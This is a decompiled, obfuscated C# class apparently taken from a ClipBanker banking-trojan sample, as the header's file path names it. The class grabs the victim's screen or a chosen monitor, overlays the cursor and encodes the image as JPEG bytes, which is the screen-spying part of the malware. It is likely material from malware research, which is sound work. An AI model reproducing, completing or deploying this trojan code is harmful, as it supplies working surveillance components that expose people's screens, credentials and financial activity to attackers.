// Decompiled with JetBrains decompiler
// Type: fih.Yo1
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00312k;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace fih
{
  internal sealed class Yo1 : IDisposable
  {
    private Bitmap \u003746;
    private IntPtr H2k;
    public Rectangle KD5;

    public void \u0023Nn()
    {
      this.\u003746?.Dispose();
      if (this.H2k != IntPtr.Zero)
        \u0036b9.c9N(this.H2k);
      this.\u003746 = (Bitmap) null;
      this.H2k = IntPtr.Zero;
    }

    public void \u0038LZ([In] string obj0)
    {
      this.H2k = \u0036b9.y65("DISPLAY", (string) null, (string) null, IntPtr.Zero);
      this.\u0033Rp(obj0);
    }

    public void \u0033Rp([In] string obj0)
    {
      this.KD5 = Screen.PrimaryScreen.Bounds;
      try
      {
        foreach (Screen allScreen in Screen.AllScreens)
        {
          if (obj0 == allScreen.DeviceName)
          {
            this.KD5 = allScreen.Bounds;
            break;
          }
        }
      }
      catch
      {
      }
      this.\u003746?.Dispose();
      this.\u003746 = new Bitmap(this.KD5.Width, this.KD5.Height, PixelFormat.Format32bppArgb);
    }

    public Bitmap t7F([In] bool obj0)
    {
      using (Graphics graphics = Graphics.FromImage((Image) this.\u003746))
      {
        IntPtr hdc = graphics.GetHdc();
        \u0036b9.\u0038h1(hdc, 0, 0, this.KD5.Width, this.KD5.Height, this.H2k, this.KD5.X, this.KD5.Y, 13369376);
        graphics.ReleaseHdc(hdc);
        if (obj0)
        {
          int x;
          int y;
          Bitmap bitmap = this.\u00397E(out x, out y);
          if (bitmap != null)
            graphics.DrawImage((Image) bitmap, new Rectangle(x, y, bitmap.Width, bitmap.Height));
        }
      }
      return this.\u003746;
    }

    public byte[] X1I([In] bool obj0)
    {
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (Graphics graphics = Graphics.FromImage((Image) this.\u003746))
        {
          IntPtr hdc = graphics.GetHdc();
          \u0036b9.\u0038h1(hdc, 0, 0, this.KD5.Width, this.KD5.Height, this.H2k, this.KD5.X, this.KD5.Y, 13369376);
          graphics.ReleaseHdc(hdc);
          if (obj0)
          {
            int x;
            int y;
            Bitmap bitmap = this.\u00397E(out x, out y);
            if (bitmap != null)
              graphics.DrawImage((Image) bitmap, new Rectangle(x, y, bitmap.Width, bitmap.Height));
          }
        }
        this.\u003746.Save((Stream) memoryStream, ImageFormat.Jpeg);
        return memoryStream.ToArray();
      }
    }

    public Bitmap \u00397E(out int _param1, out int _param2)
    {
      _param1 = 0;
      _param2 = 0;
      \u0036b9.\u0039a9 structure = new \u0036b9.\u0039a9();
      structure.M1m = Marshal.SizeOf((object) structure);
      if (!\u0036b9.Aix(out structure) || structure.\u00342Y != 1)
        return (Bitmap) null;
      \u0036b9.\u00345z obj;
      Bitmap bitmap = \u0036b9.h8Z(structure, out obj);
      _param1 = structure.j81.x57 - obj.\u0039NC;
      _param2 = structure.j81.\u0033k2 - obj.\u003699;
      return bitmap;
    }
  }
}
